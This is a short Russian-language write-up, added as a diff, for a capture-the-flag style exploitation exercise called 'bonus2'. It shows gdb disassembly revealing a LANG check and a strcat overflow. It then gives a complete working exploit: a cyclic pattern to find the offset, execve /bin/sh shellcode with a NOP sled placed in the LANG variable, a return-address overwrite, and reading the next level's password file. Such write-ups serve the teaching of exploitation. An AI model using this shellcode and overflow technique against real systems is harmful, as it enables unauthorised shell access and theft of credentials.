@@ -1,0 +1,36 @@
+gdb
+disas main
+....
+   0x080485d3 <+170>:	mov    %eax,(%esp)
+   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
+   0x080485db <+178>:	test   %eax,%eax
+   0x080485dd <+180>:	jne    0x80485eb <main+194>
+   0x080485df <+182>:	movl   $0x1,0x8049988
+   0x080485e9 <+192>:	jmp    0x8048618 <main+239>
+   0x080485eb <+194>:	movl   $0x2,0x8(%esp)
+   0x080485f3 <+202>:	movl   $0x8048740,0x4(%esp)
+   0x080485fb <+210>:	mov    0x9c(%esp),%eax
+   0x08048602 <+217>:	mov    %eax,(%esp)
+   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
+....
+
+Программа использует memcmp для проверки переменной окружения LANG
+....
+(gdb) x/s 0x8048740
+0x8048740:	 "nl"
+(gdb) x/s 0x804873d
+0x804873d:	 "fi"
+....
+Затем использует первый аргумент для конкатенации приветствия
+
+Будем использовать уязвимости strcat, чтобы вызвать переполнение буфера. Hello для этого слишком короткое приветствие, потому будет использовать "Goedemiddag!".
+-----------------------------------------------------------
+export LANG=nl
+
+r 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6httpsAa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab' 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab' // используя https://wiremask.eu/tools/buffer-overflow-pattern-generator/? находим оффсет 23 + main buffer 40 байтов
+
+Вставляем шеллкод
+export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xe9\xfe\xff\xbf"')
+whoami
+cat /home/user/bonus3/.pass
